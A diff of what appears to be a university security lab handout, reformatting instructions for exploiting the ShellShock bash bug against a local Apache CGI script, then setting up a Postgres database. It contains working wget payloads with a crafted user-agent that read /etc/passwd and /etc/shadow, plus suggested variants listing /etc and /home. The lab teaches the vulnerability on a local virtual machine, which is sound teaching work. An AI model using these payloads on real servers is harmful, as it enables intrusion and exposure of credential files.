@@ -72,7 +72,7 @@ Find and read Vulnerability Note [VU#252743](http://www.kb.cert.org/vuls/id/2527
 
 Given your answer to **Question 4**, try the two tests to check if `bash` is vulnerable (it is).
 
-# Part 3: Exploiting ShellShock #
+# Part 3: Apache Setup #
 
 Your virtual machine is already running Apache on port 80 (port 3080 for this host machine). Apache configuration files are located at `/etc/apache2`
 
@@ -120,71 +120,57 @@ Test it.
 
 ## /etc/passwd and /etc/shadow ##
 
-read the man page of shadow (man shadow). Inspect the files /etc/passwd and /etc/shadow
+Read the man page of shadow (`man shadow`). Inspect the files `/etc/passwd` and `/etc/shadow`
 
- *Question 6* Why does Linux maintain =/etc/shawdow=?
+**Question 6** Why does Linux maintain `/etc/shadow`?
 
- *Question 7* what is the difference between =/etc/passwd= and =/etc/shadow=
+**Question 7** What is the difference between `/etc/passwd` and `/etc/shadow`?
 
-** The attack
+# Part 4: ShellShocking Attack #
 
-Now we can try the attack. Using =wget= run:
+Now we can try the attack.
 
-#+begin_src bash
+- Do the following steps outside the virtual machine.
+
+Using `wget` run:
+
+```bash
 wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
-#+end_src
+```
 
-Test it. What do you get?
+Test it. What do you get in `output.txt`?
 
-*Question 8* Given your knowledge of the vulnerability, explain how the attack works.
+**Question 8** Given your knowledge of the vulnerability, explain how the attack works.
 
-** Try again
+Try it again.
 
-#+begin_src bash
+```bash
 wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
-#+end_src
+```
 
-*Question 9* Explain why this attack didn't work.
+**Question 9** Explain why this attack didn't work.
 
-*Question 10* What is the vulnerability in the /etc/password attack?
+**Question 10** What is the vulnerability in the /etc/passwd attack?
 
+# Part 5: Database Setup #
 
-** How the attack is passed to bash
+Your user `user360` has a postgres database called `lab5`. Use `psql` to connect to it. Create a table called `test` with the following schema.  
 
-Try the same attack on this script. It simply prints the environment variables that are passed to the script.
-
-#+begin_src perl
-#!/usr/bin/perl
-print "Content-type: text/html\n\n";
-foreach $key (keys %ENV) {
-print "$key --> $ENV{$key}<br>\n";
-}
-#+end_src
-
-*Question 11* In which environment variable passed to the script?
-
-Modify your script attack to try other commands. Try to execute, for example =ls -lR /etc= or =ls -lR /home/=
-
-* Set up a database
-
-Your user =seng360= has a postgres database called =lab5=. Using psql connect to it. Create a table called =test= with the following schema.  
-
-#+begin_src sql
+```sql
 create table test(
    id integer primary key,
    value integer);
-#+end_src
+```
 
-Allow anybody =select= to the table =test=:
+Allow anybody `select` to the table `test`:
 
-#+begin_src sql
+```sql
 grant select on test to public;
-#+end_src
+```
 
+Insert 10 tuples into the table `test`. The table should looks something like this. Make sure you include a tuple with `id=5`
 
-Insert 10 tuples into the table =test=. The table should looks something like this. Make sure you include a tuple with /id=5/
-
-#+begin_example
+```
 lab5=# select * from test ;
  id | value
 ----+-------
@@ -199,7 +185,7 @@ lab5=# select * from test ;
   9 |  1030
  10 |  1040
 (10 rows)
-#+end_example
+```
 
 Create a user called =web= with password =webserver=. See http://www.postgresql.org/docs/9.1/static/app-createuser.html
 
